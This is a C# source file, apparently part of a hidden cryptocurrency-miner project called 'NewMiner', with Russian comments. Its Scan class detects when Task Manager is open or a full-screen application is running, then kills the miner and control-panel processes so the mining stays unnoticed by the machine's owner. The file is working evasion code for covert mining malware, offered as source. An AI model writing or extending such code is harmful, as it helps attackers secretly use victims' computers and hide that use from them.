using System.Diagnostics;

namespace NewMiner
{
    internal class Scan
    {
        public static void Run()
        {
            if (CheckTaskMgr.Start() || FullScreenCheck.Start()) //Если хотя бы 1 из методов в классах сообщит что чтото если вырубаемся нахой
            {
                var miner_processes = Process.GetProcessesByName(Settings.minerProc); //Получаем все процессы с именем нашего майнера(об этом позже)
                foreach (var minerProc in miner_processes)
                    minerProc.Kill(); //Перебираем все процессы если процесс найден, то киляем его (ниже аналогично)
                var panel_processes = Process.GetProcessesByName(Settings.panelProc); //Получаем все процессы с именем панели или управляющей части(об этом позже)
                foreach (var panelProc in panel_processes)
                    panelProc.Kill();
            }
        }
    }
}